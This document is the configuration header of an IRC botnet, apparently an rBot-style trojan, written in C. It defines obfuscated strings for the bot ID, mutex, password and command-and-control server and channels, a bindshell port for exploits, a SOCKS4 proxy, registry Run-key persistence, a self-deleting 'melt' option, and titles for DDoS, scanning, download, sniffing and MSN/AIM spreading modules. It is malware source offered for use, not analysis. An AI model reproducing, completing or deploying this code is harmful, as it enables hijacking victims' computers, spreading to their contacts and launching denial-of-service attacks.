
char mutexhandle[]		= "\x45\x48\x8D\x45\x09\x87";		//*mutex handle

#ifndef _DEBUG
char botid[]			= "\x45\x48\x8D\x45\x09\x87";		//*bot id
#else
char botid[]			= "\x45\x48\x8D\x45\x09\x87";		//*bot id (debug)
#endif

unsigned short ftpdport	= 8082;					//*ftpd port
BOOL staticftpd			= FALSE;				// always use ftpdport for the ftpd port
unsigned short sock4port= 5892;					// socks4 port
unsigned short redirport= 999;					// redirect local port
unsigned short bindport = 4460;					//*bindshell port most of the exploits use

char prefix				= 'v';					//*command prefix
char movepath[]			= "%windir%";			//*path to move to

#ifdef _DEBUG
char debug_log[]		= "C:\\Windows\\KB9942719.log";
char debug_log_mode[]	= "a+";//"w+";
#endif

//--------------------------------------------------------------------------------------------------------
#ifndef NO_CRYPT
//--------------------------------------------------------------------------------------------------------

	char filename[]			= "\x56\x59\x94\x40\x17\x8E\xF9\x34\xE5\x69";
	/* name.exe */

#ifndef NO_FCONNECT
	char cononstart[]		= "";
	/* http://yoururl.com/here */
#endif

	char version[]			= "\x6D\x42\xAE\x41\x37\xC2\xBA\x61\xF9";

#ifndef NO_SERVICE
	char servicename[]		= "\x56\x59\x94\x40\x17\x8E\xF9\x34\xE5\x69";
	/*  service name */
	char servicedisplayname[]= "\x56\x59\x94\x40\x17\x8E\xF9\x34\xE5\x69";
	/* service display name */
	char servicedesc[]		= "\x56\x59\x94\x40\x17\x8E\xF9\x34\xE5\x69";
	/* service description */
#else
	REGENT runkey = { 
		HKEY_LOCAL_MACHINE, 
		"\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93", 
		/* SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run */
		"\x53\x45\x94\x40\x14\x95\xA4\x71\xFE\x63\x10\xCC\x47\x63"
		/* autostart description */
	};

#endif

	char password[]			= "\x10\x1F\x96\x4F\x1A\x8B\xB8\x20\xAC\x7A\x4B\xD3\x40\x34\xDE\xF9\x8D\x99\x67\xD1\x98";
	/* password */
	
#ifdef _DEBUG
	char authhost1[] = "\x0E\x0D\xD0\x64\x51";
	char *authost[] = { authhost1 };//*!*@*
#else//nick!ident@host
	char authhost1[] = "\x0E\x0D\xD0\x64\x51";//*!*@*
	char authhost2[] = "\x0E\x0D\xD0\x64\x51";//*!*@*
	char authhost3[] = "\x0E\x0D\xD0\x64\x51";//*!*@*
	char *authost[] = { authhost1, authhost2, authhost3 };
#endif

#ifndef NO_VERSION_REPLY
	char versionlist1[] = "\x49\x43\x88\x54\x13";
	char *versionlist[] = { versionlist1 };
#endif

	SERVER servers[]={
		{   
#ifndef _DEBUG // Live Config
			"\x4D\x42\x8E\x41\x17\xCC\xA4\x25\xEF\x6D\x10\xCD\x42\x61\xCB\xE6\xD1\x8A\x72",
			/* (server) */
			"",
			/* (server password) */
			6564,
			/* (server port) */
			FALSE,
			/* (ssl) */
			"\x07\x42\xC2\x76\x0E\xD7\x9D\x21\xCB\x3C\x17\xFB\x19",
			/* (main channel) */
			"\x17\x18\x9C\x4A\x49\x8F\xE4\x3A\xF1",
			/* (channel keyword) */
			"",
			/* (user mode on connect) */
			"",
			/* (channel mode on join) */
			"\x07\x42\xC2\x76\x0E\xD7\x9D\x21\xCB\x3C\x17\xFB\x19",
			/* (exploit channel) */
			"\x07\x42\xC2\x76\x0E\xD7\x9D\x21\xCB\x3C\x17\xFB\x19",
			/* (warn channel) */
			"\x07\x42\xC2\x76\x0E\xD7\x9D\x21\xCB\x3C\x17\xFB\x19"
			/* (sniff channel) */
		},
#else // Debug Config
			"\x4D\x42\x8E\x41\x17\xCC\xA4\x25\xEF\x6D\x10\xCD\x42\x61\xCB\xE6\xD1\x8A\x72",
			/* (server) */
			"",
			/* (server password) */
			6564,
			/* (server port) */
			FALSE,
			/* (ssl) */
			"\x07\x42\xC2\x76\x0E\xD7\x9D\x21\xCB\x3C\x17\xFB\x19",
			/* (main channel) */
			"\x17\x18\x9C\x4A\x49\x8F\xE4\x3A\xF1",
			/* (channel keyword) */
			"",
			/* (user mode on connect) */
			"",
			/* (channel mode on join) */
			"\x07\x42\xC2\x76\x0E\xD7\x9D\x21\xCB\x3C\x17\xFB\x19",
			/* (exploit channel) */
			"\x07\x42\xC2\x76\x0E\xD7\x9D\x21\xCB\x3C\x17\xFB\x19",
			/* (warn channel) */
			"\x07\x42\xC2\x76\x0E\xD7\x9D\x21\xCB\x3C\x17\xFB\x19"
			/* (sniff channel) */
		},
#endif
	};

#ifndef NO_MELT
	REGENT meltkey=	{ 
		HKEY_LOCAL_MACHINE, 
		"\x77\x63\xBC\x70\x2C\xA3\x85\x14\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x39\xEE\x98\x97\x3D\x90\x42\xCC\xE9\x98\xD4\x9F\x78\xAC\xDE\x8A", 
		/* SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions */
		"\x69\x49\x96\x50" 
		/* Melt */
	};
#endif
//------------------------------------------------------------------------------------------------------
#endif
//--------------------------------------------------------------------------------------------------------

char main_title[]		= "\2MAIN :: \2";
char irc_title[]		= "\2IRC :: \2";
char process_title[]	= "\2PROC :: \2";
char sec_title[]		= "\2SECURE :: \2";
char unsec_title[]		= "\2UNSECURE :: \2";
char scan_title[]		= "\2SCAN :: \2";
char ftp_title[]		= "\2FTP :: \2";
char file_title[]		= "\2FILE :: \2";
char download_title[]	= "\2DOWNLOAD :: \2";
char update_title[]		= "\2UPDATE :: \2";
char logic_title[]		= "\2LOGIC :: \2";
char reg_title[]		= "\2REG :: \2";
char tcp_title[]		= "\2TCP :: \2";
char udp_title[]		= "\2UDP :: \2";
char sock4_title[]		= "\2SOCKS4 :: \2";
char ddos_title[]		= "\2DDOS :: \2";
char warn_title[]		= "\2WARN :: \2";
char threads_title[]	= "\2THREADS :: \2";
char imspread_title[]	= "\2IM :: \2";
char msnspread_title[]  = "\2MSN :: \2";
char aimspread_title[]  = "\2AIM :: \2";